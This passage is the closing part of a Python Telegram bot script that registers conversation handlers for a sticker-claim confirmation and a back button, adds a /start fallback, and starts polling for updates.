                CallbackQueryHandler(handle_claim_sticker_confirmation, pattern="^claim_sticker_confirm_(yes|no)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
        },
        fallbacks=[CommandHandler("start", start)],
        allow_reentry=True,
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
